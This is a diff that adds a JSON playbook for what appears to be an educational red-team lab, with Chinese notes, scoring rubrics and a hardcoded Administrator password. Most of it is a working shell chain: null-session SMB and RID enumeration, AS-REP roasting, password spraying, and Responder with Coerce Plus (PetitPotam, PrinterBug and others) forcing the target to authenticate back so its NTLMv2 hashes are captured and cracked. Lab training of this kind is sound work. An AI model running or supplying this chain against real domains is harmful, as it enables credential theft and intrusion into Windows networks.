@@ -1,0 +1,136 @@
+{
+  "id": "ntlm_relay_responder_basic",
+  "name": "NTLM Credential Capture via Coercion (Auto-Discovery Chain)",
+  "description": "全自动 NTLM 凭据捕获链。Phase 1: 空会话 SMB 侦察 + RID 枚举域用户。Phase 2: AS-REP  roasting (无凭据/无锁定风险) + 受限密码喷洒。Phase 3: 使用发现的凭据通过 Coerce Plus 强制认证，Responder 截获 NTLMv2 哈希。全程无需预配置凭据，模拟真实红队侦察→凭据获取→利用的完整链条。",
+  "category": "credential-access",
+  "difficulty": "intermediate",
+  "estimatedDuration": "5-10 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Credential Access",
+    "Collection",
+    "Discovery"
+  ],
+  "mitreTechniques": [
+    "T1557.001",
+    "T1040",
+    "T1110.002",
+    "T1087.002",
+    "T1558.004"
+  ],
+  "targetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "win_profile": {
+    "username": "Administrator",
+    "password": "200209"
+  },
+  "steps": [
+    {
+      "id": "step1_responder_verify",
+      "name": "Verify Responder Availability",
+      "description": "验证 Responder 工具可用性，展示监听器配置。实际后台监听由 step2 接管。",
+      "toolId": "responder",
+      "argsTemplate": [
+        "-I",
+        "eth0",
+        "-v",
+        "-F"
+      ],
+      "score": 5,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1557.001"
+      ],
+      "educationalNote": "Responder 通过 LLMNR/NBT-NS/mDNS 投毒和内置 SMB/HTTP 认证服务器捕获 NTLMv2 哈希。此步骤仅验证工具可用性，step2 将以 Python euid hack 后台模式重新拉起 Responder 以确保捕获窗口覆盖触发时序。",
+      "requires_teacher_review": true,
+      "optional": true,
+      "payload_id": "ntlm-relay"
+    },
+    {
+      "id": "step2_auto_chain",
+      "name": "Automated Recon -> Credential Discovery -> Coercion",
+      "description": "全自动攻击链。Phase 0: 后台启动 Responder。Phase 1: 空会话 SMB 侦察 + RID 枚举域用户。Phase 2: AS-REP roasting + 受限密码喷洒。Phase 3: 使用发现的凭据执行 Coerce Plus 强制认证。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "echo '=== NTLM Credential Capture (Automated Chain) ===';echo 'Target: {{host}} | User: {{username}}';echo -n 'Password pre-configured: ';[ -z '{{password}}' ] && echo 'NO (will auto-discover)' || echo 'YES';: 'Phase 0: Start Responder in background';: 'skip pkill (self-kill avoidance)';sleep 1;mkdir -p /tmp/responder-noroot/logs;python3 -u -c 'import os; os.geteuid=lambda:0; exec(open(\"/opt/Responder/Responder.py\").read())' -I eth0 -v -F > /tmp/responder-noroot/logs/responder_bg.log 2>&1 & RPID=$!;sleep 5;if kill -0 $RPID 2>/dev/null; then echo \"Responder started PID=$RPID\"; else echo 'WARN: Responder failed to start!'; fi;: 'Determine attacker IP for coercion callback';ATTACKER_IP=$(ip route get {{host}} 2>/dev/null | grep -oP 'src \\K[\\d.]+' || hostname -I 2>/dev/null | awk '{print $1}');echo \"Attacker IP: $ATTACKER_IP\";: '=== Phase 1: Null Session Reconnaissance ===';echo '=== Phase 1: Null Session Recon ===';echo '--- SMB Shares (anonymous) ---';timeout 15 netexec smb {{host}} -u '' -p '' --shares 2>&1;echo '--- RID Brute Force (User Enumeration) ---';timeout 45 netexec smb {{host}} -u '' -p '' --rid-brute 2>&1 | tee /tmp/rid_out.txt;grep -oP '^[a-zA-Z][a-zA-Z0-9._-]+' /tmp/rid_out.txt 2>/dev/null | sort -u | head -20 > /tmp/domain_users.txt;echo \"Users enumerated: $(wc -l < /tmp/domain_users.txt 2>/dev/null || echo 0)\";: '=== Phase 2: Credential Discovery ===';echo '=== Phase 2: Credential Discovery ===';FOUND_USER='';FOUND_PASS='';: '2a: Pre-configured credentials (env vars)';if [ -n '{{password}}' ]; then  FOUND_USER='{{username}}';  FOUND_PASS='{{password}}';  echo \"Using pre-configured credential: $FOUND_USER\";fi;: '2b: AS-REP roasting (no credentials needed, no lockout risk)';if [ -z \"$FOUND_PASS\" ] && [ -s /tmp/domain_users.txt ]; then  echo '--- AS-REP Roasting (safe, no lockout risk) ---';  timeout 45 netexec smb {{host}} -u /tmp/domain_users.txt -p '' --asreproast 2>&1 | tee /tmp/asrep_out.txt;  if grep -q '\\$krb5asrep' /tmp/asrep_out.txt 2>/dev/null; then    echo 'SUCCESS: AS-REP hash obtained! Crack with hashcat -m 18200';  else    echo 'No AS-REP roastable users found (requires UF_DONT_REQUIRE_PREAUTH flag)';  fi;fi;: '2c: Limited password spray against enumerated users';if [ -z \"$FOUND_PASS\" ] && [ -s /tmp/domain_users.txt ]; then  echo '--- Limited Password Spray (3 most common lab passwords) ---';  for pw in Password123 P@ssw0rd admin; do    echo \"Trying password: $pw\";    timeout 30 netexec smb {{host}} -u /tmp/domain_users.txt -p \"$pw\" --continue-on-success 2>&1 | tee /tmp/spray_out.txt;    if grep -qE '\\[\\+\\]|pwn3d|OWNED' /tmp/spray_out.txt 2>/dev/null; then      FOUND_PASS=\"$pw\";      echo \"SUCCESS: Valid credentials found with password '$pw'\";      break;    fi;  done;fi;: '2d: Fallback — try Administrator directly with common passwords';if [ -z \"$FOUND_PASS\" ]; then  echo '--- Fallback: Administrator + common passwords ---';  for pw in Password123 P@ssw0rd admin123; do    timeout 15 netexec smb {{host}} -u Administrator -p \"$pw\" 2>&1 | tee /tmp/admin_spray.txt;    if grep -qE '\\[\\+\\]|pwn3d|OWNED' /tmp/admin_spray.txt 2>/dev/null; then      FOUND_USER='Administrator';      FOUND_PASS=\"$pw\";      echo \"SUCCESS: Administrator / $pw\";      break;    fi;  done;fi;: '=== Phase 3: NTLM Coercion ===';echo '=== Phase 3: NTLM Coercion ===';if [ -n \"$FOUND_PASS\" ]; then  CU=\"${FOUND_USER:-Administrator}\";  echo \"Coercion with credentials: $CU @ {{host}}\";  echo '--- SMB Share Verification ---';  timeout 30 netexec smb {{host}} -u \"$CU\" -p \"$FOUND_PASS\" --shares 2>&1;  echo '--- Coerce Plus (PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce/MSEven) ---';  timeout 30 netexec smb {{host}} -u \"$CU\" -p \"$FOUND_PASS\" -M coerce_plus -o LISTENER=\"$ATTACKER_IP\" 2>&1;  echo 'Coercion complete — target should have connected back to Responder';else  echo 'WARNING: No valid credentials discovered!';  echo '';  echo 'Null session coercion attempt (expect VULNERABLE detection only):';  timeout 30 netexec smb {{host}} -u '' -p '' -M coerce_plus -o LISTENER=\"$ATTACKER_IP\" 2>&1;  echo '';  echo '=== DIAGNOSIS ===';  echo 'Coercion on Windows Server 2019 requires valid domain credentials.';  echo 'This playbook attempted: RID brute -> AS-REP roast -> password spray.';  echo 'All techniques failed or were blocked by target hardening.';  echo '';  echo 'To provide known credentials, set environment variables:';  echo '  export HEXSTRIKE_WIN_USERNAME=DOMAIN\\\\User';  echo '  export HEXSTRIKE_WIN_PASSWORD=password';  echo 'Then re-run this playbook.';fi;: 'Cleanup';sleep 5;kill $RPID 2>/dev/null;wait $RPID 2>/dev/null;echo '=== Attack chain complete ==='"
+      ],
+      "score": 15,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1557.001",
+        "T1087.002",
+        "T1558.004",
+        "T1110.002"
+      ],
+      "educationalNote": "完整红队攻击链：\nPhase 1 — 空会话侦察 (T1087.002): 使用 netexec 匿名 SMB 连接进行共享枚举和 RID 遍历，从 AD 提取域用户名列表。现代 WinSvr2019 默认限制匿名 SAMR 访问，若 RID brute 无输出则进入 Phase 2 fallback。\nPhase 2a — AS-REP Roasting (T1558.004): 对所有枚举到的用户尝试无密码 AS-REP 请求，若用户设置了 UF_DONT_REQUIRE_PREAUTH 标志，DC 返回用用户密码加密的 TGT，可离线破解 (hashcat -m 18200)。此技术不需要任何凭据且不会产生登录失败事件。\nPhase 2b — 受限密码喷洒 (T1110.002): 仅尝试 3 个常见实验环境密码 (Password123, P@ssw0rd, admin)，对枚举用户进行喷洒，使用 --continue-on-success 在成功后继续以枚举更多有效凭据。\nPhase 3 — 强制认证 (T1557.001): 使用发现的凭据通过 Coerce Plus 的 5 种 RPC 向量 (PetitPotam MS-EFSRPC / PrinterBug MS-RPRN / DFSCoerce MS-DFSNM / ShadowCoerce MS-FSRVP / MSEven) 强制靶机回连攻击机，Responder 截获 NTLMv2 哈希。\n若无凭据可用，降级为空会话探测（仅输出 VULNERABLE 检测结果，无法真正触发利用）。\n防御: 禁用 NetBIOS/LLMNR, 启用 SMB 签名, 强制 Kerberos, 审计匿名 SMB 访问, 审查 UF_DONT_REQUIRE_PREAUTH 使用, 部署强密码策略。"
+    },
+    {
+      "id": "step3_check_logs",
+      "name": "Check for Captured NTLMv2 Hashes",
+      "description": "检查 Responder 日志目录，查找捕获到的 NTLMv2-SSP 哈希证据。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "sleep 2; echo '=== Responder Logs ==='; ls -la /tmp/responder-noroot/logs/ 2>/dev/null; echo '=== NTLMv2 Hashes ==='; grep -a 'NTLMv2' /tmp/responder-noroot/logs/*.txt 2>/dev/null || echo 'No NTLMv2 hashes captured in this run'; echo '=== AS-REP Output ==='; cat /tmp/asrep_out.txt 2>/dev/null || echo '(no AS-REP output)'; echo '=== Spray Results ==='; grep -lF '[+]' /tmp/spray_out.txt /tmp/admin_spray.txt 2>/dev/null || echo '(no successful spray)'"
+      ],
+      "score": 20,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1040"
+      ],
+      "educationalNote": "Responder 将捕获的 NTLMv2 哈希保存在 /tmp/responder-noroot/logs/ 目录的 SMB-NTLMv2-SSP-*.txt 文件中，格式为 username::domain:challenge:response。这些哈希可使用 hashcat -m 5600 或 John the Ripper 进行离线破解 (T1110.002)。同时展示 AS-REP roasting 和密码喷洒的中间结果文件。防御措施：禁用 NetBIOS over TCP/IP 和 LLMNR（组策略），启用 SMB 签名，迁移到 Kerberos 认证。"
+    }
+  ],
+  "rubric": {
+    "items": [
+      {
+        "id": "responder_verified",
+        "desc": "Responder 工具可用性验证通过",
+        "points": 5,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Responder|NBT-NS|LLMNR|Listening"
+        }
+      },
+      {
+        "id": "recon_and_discovery",
+        "desc": "完成侦察和凭据发现流程",
+        "points": 15,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Recon|SMB|enum|Discovery|AS-REP|Spray"
+        }
+      },
+      {
+        "id": "ntlm_hash_captured",
+        "desc": "在日志中发现捕获的 NTLMv2 哈希",
+        "points": 20,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "NTLMv2|SMB-NTLMv2|hash"
+        }
+      }
+    ]
+  },
+  "notSuitableFor": [
+    "dvwa",
+    "local_ip",
+    "web_url"
+  ],
+  "baselineGroup": "windows-exploitation",
+  "expectedOutputPolicy": "may_be_empty_if_no_match",
+  "emptyOutputExplanation": "全自动凭据发现链取决于靶机配置：(1) 空会话 RID 枚举是否被 AD 限制（WinSvr2019 默认限制匿名 SAMR）；(2) 是否存在 UF_DONT_REQUIRE_PREAUTH 用户用于 AS-REP roasting；(3) 枚举到的用户是否使用常见实验密码。若所有技术均被防御，无有效凭据则无法触发真正的强制认证。可设置 HEXSTRIKE_WIN_USERNAME / HEXSTRIKE_WIN_PASSWORD 环境变量提供已知凭据跳过发现阶段。",
+  "applicableTargetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "teachingObjective": "演示完整红队攻击链：空会话侦察 (T1087.002) → 域用户枚举 → AS-REP roasting (T1558.004) → 密码喷洒 (T1110.002) → 强制认证 (T1557.001) → NTLMv2 哈希捕获 (T1040)。全程无需预配置凭据，展示真实红队从零开始获取凭据的完整方法论。",
+  "target_class": "windows_ad",
+  "disableAutoInsert": true
+}
